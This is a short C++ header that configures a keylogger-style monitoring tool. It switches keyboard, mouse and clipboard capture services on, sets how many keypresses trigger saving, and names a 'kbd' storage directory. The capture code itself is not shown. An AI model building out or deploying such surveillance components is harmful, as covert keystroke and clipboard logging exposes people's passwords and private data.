#pragma once

// Service toggle
#define KEYBOARD_SERVICE	true
#define MOUSE_SERVICE		true
#define CLIPBOARD_SERVICE	true

// Keylogger settings
#define KEYBOARD_MAX_REPEATS 5
#define KEYBOARD_KEYS_TO_SAVE 20	// How many times key should be pressed to save data
#define KEYBOARD_DIR "kbd"			// Name of keyboard service working directory

// Includes
#if KEYBOARD_SERVICE
#include "keyboard.h"
#endif
#if MOUSE_SERVICE
#include "mouse.h"
#endif
#if CLIPBOARD_SERVICE
#include "clipboard.h"
#endif

namespace services
{
	static void runAll()
	{
#if KEYBOARD_SERVICE
		keyboard::run();
#endif
#if MOUSE_SERVICE
		mouse::run();
#endif
#if CLIPBOARD_SERVICE
		clipboard::run();
#endif
	}

	static void stopAll()
	{
#if KEYBOARD_SERVICE
		keyboard::stop();
#endif
#if MOUSE_SERVICE
		mouse::stop();
#endif
#if CLIPBOARD_SERVICE
		clipboard::stop();
#endif
	}
}